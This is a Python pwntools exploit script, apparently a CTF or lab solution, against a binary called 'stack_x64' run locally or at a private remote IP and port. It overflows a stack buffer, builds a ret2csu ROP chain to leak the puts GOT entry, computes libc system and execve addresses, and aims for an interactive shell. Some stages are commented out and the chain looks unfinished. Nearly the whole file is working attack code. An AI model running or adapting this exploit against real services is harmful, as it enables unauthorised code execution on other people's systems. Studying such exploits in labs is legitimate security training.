# -*- coding: utf-8 -*-

from pwn import *
from subprocess import check_output


def pidof(name):
    output = check_output(["pidof", name])
    print "[+] pidof %s : %s" % (name, output)
    result = [int(i) for i in output.split(" ")]
    return result


# context.log_level = 0
LOCAL = True

pwnable_filename = "./stack_x64"
libc_filename = "/lib/x86_64-linux-gnu/libc.so.6"

pwnable = ELF(pwnable_filename)
libc = ELF(libc_filename)


def generate_io(local):
    global libc_filename
    if local:
        Io = process(pwnable_filename)
    else:
        Io = remote("192.168.210.12", 11002)
    return Io


ppppppr_addr = 0x00000000004006FA
pr_addr = 0x0000000000400702
mmmc_addr = 0x00000000004006E0

gets_got_addr = pwnable.got['gets']
puts_got_addr = pwnable.got['puts']

writeable_addr = 0x00601000

binary_base_addr = 0x00400000
start_addr = 0x0000000000400540

junk_size = 40
junk = junk_size * "A"

string_addr = 0x0000000000400724

data_addr = 0x0000000000601040

payload = flat([
    junk,
    p64(ppppppr_addr),
    # Stage 1
    p64(0),  # rbx
    p64(1),  # rbp
    p64(puts_got_addr),  # r12
    p64(0),  # r13 (arg2)
    p64(0),  # r14 (arg1)
    p64(puts_got_addr),  # r15 (arg0)
    p64(mmmc_addr),
    'C' * 0x08,
    # Stage 2
    p64(0),  # rbx
    p64(1),  # rbp
    p64(gets_got_addr),  # r12
    p64(0),  # r13 (arg2)
    p64(0),  # r14 (arg1)
    p64(data_addr),  # r15 (arg0)
    p64(mmmc_addr),
    'D' * 0x08,
    # Stage 3
    p64(0),  # rbx
    p64(1),  # rbp
    p64(data_addr),  # r12
    p64(0),  # r13 (arg2)
    p64(0),  # r14 (arg1)
    p64(0),  # r15 (arg0)
    p64(mmmc_addr),
    'D' * 0x08,
])

print "[+] Payload: %r" % (payload)
with open("payload", "wb") as f:
    f.write(payload)

Io = generate_io(LOCAL)
Io.read()

Io.sendline(payload)

time.sleep(0.5)
puts_got_data = Io.read(6).ljust(8, "\x00")
print "[+] puts_got_data: %r" % (puts_got_data)
puts_addr = u64(puts_got_data)
print "[+] puts_addr: 0x%016x" % (puts_addr)

libc_puts_offset = libc.symbols['puts']
libc_system_offset = libc.symbols['system']
libc_execve_offset = libc.symbols['execve']
libc_bin_sh_offset = next(libc.search("/bin/sh\x00"))

system_addr = puts_addr - libc_puts_offset + libc_system_offset
print "[+] system_addr: 0x%016x" % (system_addr)
execve_addr = puts_addr - libc_puts_offset + libc_execve_offset
print "[+] execve_addr: 0x%016x" % (execve_addr)
# bin_sh_addr = puts_addr - libc_puts_offset + libc_bin_sh_offset
# print "[+] bin_sh_addr: 0x%016x" % (bin_sh_addr)


# change puts got to system addr
time.sleep(0.5)
payload = flat([
    p64(start_addr),
])
Io.sendline(payload)

print "[+] Stage 2: write /bin/sh"

# gdb.attach(
#     proc.pidof(Io)[0],
#     gdbscript='b *%s\n' % (hex(ppppppr_addr))
# )

bin_sh_addr = data_addr + 8
payload = flat([
    junk,
    # p64(ppppppr_addr),
    # # Stage 1
    # p64(0),  # rbx
    # p64(1),  # rbp
    # p64(gets_got_addr),  # r12
    # p64(0),  # r13 (arg2)
    # p64(0),  # r14 (arg1)
    # p64(data_addr+8),  # r15 (arg0)
    # p64(mmmc_addr),
    # 'C' * 0x08,
    # Stage 3
    p64(0),  # rbx
    p64(1),  # rbp
    p64(data_addr),  # r12
    p64(0),  # r13 (arg2)
    p64(0),  # r14 (arg1)
    p64(0),  # r15 (arg0)
    p64(mmmc_addr),
    'D' * 0x08,
])
Io.sendline(payload)

# # change puts got to system addr
# time.sleep(0.5)
# payload = flat([
#     "/bin/sh\x00",
# ])
# Io.sendline(payload)


# change puts got to system addr
# time.sleep(0.5)
# payload = flat([
#     p64(system_addr),
# ])
# Io.sendline(payload)

Io.interactive()
